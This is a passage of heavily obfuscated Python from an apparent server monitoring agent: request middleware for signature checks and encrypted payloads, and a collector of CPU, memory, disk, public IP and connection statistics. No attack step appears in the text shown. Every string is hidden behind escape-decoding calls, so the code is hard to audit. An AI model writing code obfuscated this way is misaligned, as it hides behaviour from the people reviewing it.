            O0_var_113 = getattr(request.app.state, codecs.decode('\\u0074\\u0065\\u006d\\u0070\\u005f\\u006b\\u0065\\u0079\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
            if O0_var_113 is not None:
                O0_var_112 = O0_var_113.get_active_ecdsa_vk()
            O0_var_114 = crypto.identify_signer(O0_var_109, O0_var_110, O0_var_111, O0_var_112)
            request.state.is_authenticated = True
            request.state.key_source = O0_var_114
        except Exception as e:
            if O0_var_107 in O0_var_108:
                return await O0_var_105(request)
            else:
                return JSONResponse(status_code=status.HTTP_401_UNAUTHORIZED, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e))})
        O0_var_115 = None
        if O0_var_106.get(codecs.decode('\\u0078\\u002d\\u0061\\u0065\\u0073\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')) == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape'):
            if request.state.is_authenticated:
                O0_var_116 = await request.body()
                if O0_var_116:
                    try:
                        O0_var_117 = O0_var_116.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        O0_var_118 = CryptoManager.decrypt_data(O0_var_117, Config._raw_key)
                        if Config.DEBUG:
                            Logger.debug(codecs.decode('\\u0020\\u005b\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u005d\\u0020\\u0053\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_118[:100]) + codecs.decode('\\u002e\\u002e\\u002e', 'unicode_escape'))
                        json.loads(O0_var_118)
                        O0_var_115 = O0_var_118.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        request._body = O0_var_115
                    except Exception as e:
                        Logger.error(codecs.decode('\\U0001f4a5\\u0020\\u005b\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u005d\\u0020\\u0046\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e)))
                        return JSONResponse(status_code=status.HTTP_400_BAD_REQUEST, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e))})
            else:
                return JSONResponse(status_code=status.HTTP_403_FORBIDDEN, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0072\\u0065\\u006a\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0066\\u006f\\u0072\\u0020\\u0075\\u006e\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0073', 'unicode_escape')})
        O0_var_119 = request.receive
        O0_var_120 = False

        async def wrapped_receive():
            nonlocal O0_var_120
            if O0_var_115 is not None:
                if not O0_var_120:
                    O0_var_120 = True
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): O0_var_115, codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
                else:
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): b'', codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
            else:
                return await O0_var_119()
        request._receive = wrapped_receive
        try:
            response = await O0_var_105(request)
        except Exception as exc:
            raise exc
        if response.headers.get(codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')).startswith(codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape')):
            O0_var_121 = []
            async for O0_var_122 in response.body_iterator:
                O0_var_121.append(O0_var_122)
            O0_var_116 = b''.join(O0_var_121)
            try:
                O0_var_123 = json.loads(O0_var_116.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
                if getattr(request.state, codecs.decode('\\u0069\\u0073\\u005f\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'), False):
                    O0_var_124 = crypto.ecies_pubkey
                    if getattr(request.state, codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063', 'unicode_escape')) == codecs.decode('\\u0074\\u0065\\u006d\\u0070', 'unicode_escape'):
                        O0_var_113 = getattr(request.app.state, codecs.decode('\\u0074\\u0065\\u006d\\u0070\\u005f\\u006b\\u0065\\u0079\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
                        if O0_var_113 is not None:
                            O0_var_124 = O0_var_113.get_active_ecies_pub() or O0_var_124
                    O0_var_125 = crypto.encrypt_response(O0_var_123, O0_var_124)
                    O0_var_126 = O0_var_125.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                    if not Config.DEBUG:
                        response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')] = codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
                        response.headers[codecs.decode('\\u0078\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')] = Config.AGENT_VERSION
                else:
                    O0_var_126 = O0_var_116
                    response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')] = codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')
                response.body_iterator = self._async_iter([O0_var_126])
                response.headers[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] = str(len(O0_var_126))
            except json.JSONDecodeError:
                pass
        return response

    @staticmethod
    async def _async_iter(items):
        for O0_var_127 in items:
            yield O0_var_127

class SystemInfoCollector:
    codecs.decode('\\u7cfb\\u7edf\\u4fe1\\u606f\\u6536\\u96c6\\u5668\\u0020\\u0028\\u5df2\\u4fee\\u590d\\u8de8\\u8bf7\\u6c42\\u5b9e\\u4f8b\\u5316\\u751f\\u547d\\u5468\\u671f\\u5bfc\\u81f4\\u7684\\u0020\\u0030\\u0025\\u0020\\u72b6\\u6001\\u0020\\u0042\\u0075\\u0067\\u0029', 'unicode_escape')
    _last_cpu_times = None
    _last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): 0, codecs.decode('\\u0074\\u0078', 'unicode_escape'): 0}
    _total_network_up = 0
    _total_network_down = 0
    _last_network_time = time.time()
    _cpu_init_lock = asyncio.Lock()

    def __init__(self):
        pass

    async def get_basic_info(self) -> Dict[str, Any]:
        O0_var_128 = self._get_linux_distribution()
        O0_var_129, O0_var_130 = await asyncio.gather(self._get_public_ip_v4(), self._get_public_ip_v6(), return_exceptions=True)
        O0_var_129 = O0_var_129 if not isinstance(O0_var_129, Exception) else None
        O0_var_130 = O0_var_130 if not isinstance(O0_var_130, Exception) else None
        if isinstance(O0_var_129, Exception):
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0020\\u0049\\u0050\\u0076\\u0034\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(O0_var_129), 1)
            O0_var_129 = None
        if isinstance(O0_var_130, Exception):
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0020\\u0049\\u0050\\u0076\\u0036\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(O0_var_130), 1)
            O0_var_130 = None
        O0_var_131 = str(O0_var_128['name']) + codecs.decode('\\u0020', 'unicode_escape') + str(O0_var_128['version']) if O0_var_128[codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')] != codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape') else platform.system()
        O0_var_132 = {codecs.decode('\\u0061\\u0072\\u0063\\u0068', 'unicode_escape'): platform.machine(), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u0063\\u006f\\u0072\\u0065\\u0073', 'unicode_escape'): psutil.cpu_count(), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): self._get_cpu_name(), codecs.decode('\\u0064\\u0069\\u0073\\u006b\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): await self._get_disk_total(), codecs.decode('\\u0067\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0069\\u0070\\u0076\\u0034', 'unicode_escape'): O0_var_129, codecs.decode('\\u0069\\u0070\\u0076\\u0036', 'unicode_escape'): O0_var_130, codecs.decode('\\u006d\\u0065\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): self._get_container_mem_limit(), codecs.decode('\\u006f\\u0073', 'unicode_escape'): O0_var_131, codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u005f\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): platform.release(), codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): psutil.swap_memory().total, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION, codecs.decode('\\u0076\\u0069\\u0072\\u0074\\u0075\\u0061\\u006c\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): self._get_virtualization()}
        Logger.debug(codecs.decode('\\u57fa\\u7840\\u4fe1\\u606f\\u6570\\u636e\\u003a\\u0020', 'unicode_escape') + str(json.dumps(O0_var_132, indent=2)), 1)
        return O0_var_132

    async def get_realtime_info(self) -> Dict[str, Any]:
        O0_var_133 = await self._get_cpu_usage()
        O0_var_134 = await self._get_network_stats()
        O0_var_135 = await self._get_memory_info()
        O0_var_136 = await self._get_disk_info()
        try:
            O0_var_137 = len(psutil.pids())
        except Exception as e:
            O0_var_137 = 0
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u8fdb\\u7a0b\\u6570\\u5931\\u8d25\\uff1a', 'unicode_escape') + str(e), 1)
        O0_var_138 = {codecs.decode('\\u0063\\u0070\\u0075', 'unicode_escape'): {codecs.decode('\\u0075\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): O0_var_133}, codecs.decode('\\u0072\\u0061\\u006d', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_135[codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_135[codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u0073\\u0077\\u0061\\u0070', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_135[codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_135[codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'): {codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031', 'unicode_escape'): round(psutil.getloadavg()[0] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2), codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0035', 'unicode_escape'): round(psutil.getloadavg()[1] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2), codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031\\u0035', 'unicode_escape'): round(psutil.getloadavg()[2] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2)}, codecs.decode('\\u0064\\u0069\\u0073\\u006b', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_136[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_136[codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u006e\\u0065\\u0074\\u0077\\u006f\\u0072\\u006b', 'unicode_escape'): {codecs.decode('\\u0075\\u0070', 'unicode_escape'): O0_var_134[codecs.decode('\\u0075\\u0070', 'unicode_escape')], codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): O0_var_134[codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape')], codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0055\\u0070', 'unicode_escape'): O0_var_134[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape')], codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0044\\u006f\\u0077\\u006e', 'unicode_escape'): O0_var_134[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape')]}, codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0073', 'unicode_escape'): {codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'): await self._get_tcp_connections(), codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape'): await self._get_udp_connections()}, codecs.decode('\\u0075\\u0070\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): int(time.time() - psutil.boot_time()), codecs.decode('\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_137, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('', 'unicode_escape')}
        Logger.debug(codecs.decode('\\u5b9e\\u65f6\\u76d1\\u63a7\\u6570\\u636e\\u003a\\u0020', 'unicode_escape') + str(json.dumps(O0_var_138, indent=2)), 2)
        return O0_var_138

    def _get_cpu_name(self) -> str:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                import winreg
                O0_var_139 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, codecs.decode('\\u0048\\u0041\\u0052\\u0044\\u0057\\u0041\\u0052\\u0045\\u005c\\u0044\\u0045\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054\\u0049\\u004f\\u004e\\u005c\\u0053\\u0079\\u0073\\u0074\\u0065\\u006d\\u005c\\u0043\\u0065\\u006e\\u0074\\u0072\\u0061\\u006c\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u005c\\u0030', 'unicode_escape'))
                O0_var_140 = winreg.QueryValueEx(O0_var_139, codecs.decode('\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))[0]
                winreg.CloseKey(O0_var_139)
                return O0_var_140.strip()
            else:
                with open(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0063\\u0070\\u0075\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_141:
                    for O0_var_142 in O0_var_141:
                        if O0_var_142.strip().startswith(codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u006c\\u0020\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')):
                            return O0_var_142.split(codecs.decode('\\u003a', 'unicode_escape'))[1].strip()
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0043\\u0050\\u0055\\u540d\\u79f0\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 1)
        return codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0043\\u0050\\u0055', 'unicode_escape')

    async def _get_cpu_usage(self) -> float:
        try:
            O0_var_143 = psutil.cpu_times()
            async with SystemInfoCollector._cpu_init_lock:
                if SystemInfoCollector._last_cpu_times is None:
                    SystemInfoCollector._last_cpu_times = O0_var_143
                    await asyncio.sleep(0.1)
                    O0_var_143 = psutil.cpu_times()
                O0_var_144 = SystemInfoCollector._last_cpu_times
                SystemInfoCollector._last_cpu_times = O0_var_143
            O0_var_145 = sum(O0_var_143) - sum(O0_var_144)
            O0_var_146 = O0_var_143.idle - O0_var_144.idle
            if O0_var_145 <= 0:
                return 0.0
            O0_var_147 = (O0_var_145 - O0_var_146) / O0_var_145 * 100
            return round(max(0.0, min(100.0, O0_var_147)), 2)
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0043\\u0050\\u0055\\u4f7f\\u7528\\u7387\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 2)
            return 0.0

    def _get_container_mem_limit(self) -> int:
        try:
            if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006d\\u0061\\u0078', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006d\\u0061\\u0078', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_148:
                    O0_var_149 = O0_var_148.read().strip()
                    if O0_var_149 != codecs.decode('\\u006d\\u0061\\u0078', 'unicode_escape'):
                        return int(O0_var_149)
        except (OSError, ValueError):
            pass
        try:
            if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006c\\u0069\\u006d\\u0069\\u0074\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006c\\u0069\\u006d\\u0069\\u0074\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_148:
                    O0_var_149 = int(O0_var_148.read().strip())
                    if O0_var_149 < 9223372036854771712:
                        return O0_var_149
        except (OSError, ValueError):
            pass
        return psutil.virtual_memory().total

    def _get_container_mem_usage(self) -> int:
        if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074', 'unicode_escape')) and os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape')):
            try:
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_150:
                    O0_var_151 = int(O0_var_150.read().strip())
                O0_var_152 = 0
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_150:
                    for O0_var_153 in O0_var_150:
                        O0_var_154 = O0_var_153.strip().split()
                        if len(O0_var_154) == 2 and O0_var_154[0] == codecs.decode('\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'):
                            O0_var_152 = int(O0_var_154[1])
                            break
                return max(0, O0_var_151 - O0_var_152)
            except (OSError, ValueError):
                pass
        if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0075\\u0073\\u0061\\u0067\\u0065\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')) and os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape')):
            try:
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0075\\u0073\\u0061\\u0067\\u0065\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_150:
                    O0_var_151 = int(O0_var_150.read().strip())
                O0_var_155 = 0
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_150:
                    for O0_var_153 in O0_var_150:
                        O0_var_154 = O0_var_153.strip().split()
                        if len(O0_var_154) == 2 and O0_var_154[0] == codecs.decode('\\u0063\\u0061\\u0063\\u0068\\u0065', 'unicode_escape'):
                            O0_var_155 = int(O0_var_154[1])
                            break
                return max(0, O0_var_151 - O0_var_155)
            except (OSError, ValueError):
                pass
        return psutil.virtual_memory().used

    async def _get_memory_info(self) -> Dict[str, int]:
        try:
            O0_var_156 = self._get_container_mem_limit()
            O0_var_157 = self._get_container_mem_usage()
            O0_var_158 = psutil.swap_memory()
            return {codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_156, codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_157, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_158.total, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_158.used}
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u5185\\u5b58\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 2)
            return {codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    def _get_physical_disk_device(self, O0_var_159: str) -> Optional[str]:
        if platform.system() != codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape'):
            return O0_var_159
        import re
        O0_var_160 = O0_var_159.replace(codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape'), codecs.decode('', 'unicode_escape'))
        if not O0_var_160:
            return None
        if re.match(codecs.decode('\\u005e\\u005b\\u0061\\u002d\\u007a\\u0041\\u002d\\u005a\\u0030\\u002d\\u0039\\u005c\\u002e\\u005c\\u002d\\u005f\\u005d\\u002b\\u003a', 'unicode_escape'), O0_var_160) or O0_var_160.startswith(codecs.decode('\\u002f\\u002f', 'unicode_escape')):
            return O0_var_159
        O0_var_161 = [codecs.decode('\\u005e\\u0028\\u006d\\u0064\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0029\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0073\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0078\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u006d\\u006d\\u0063\\u0062\\u006c\\u006b\\u005c\\u0064\\u002b\\u0029\\u0070\\u003f\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u006e\\u0076\\u006d\\u0065\\u005c\\u0064\\u002b\\u006e\\u005c\\u0064\\u002b\\u0029\\u0070\\u003f\\u005c\\u0064\\u002a\\u0024', 'unicode_escape')]
        for O0_var_162 in O0_var_161:
            O0_var_163 = re.match(O0_var_162, O0_var_160)
            if O0_var_163:
                return codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_163.group(1))
        if not re.search(codecs.decode('\\u005c\\u0064', 'unicode_escape'), O0_var_160):
            return O0_var_159
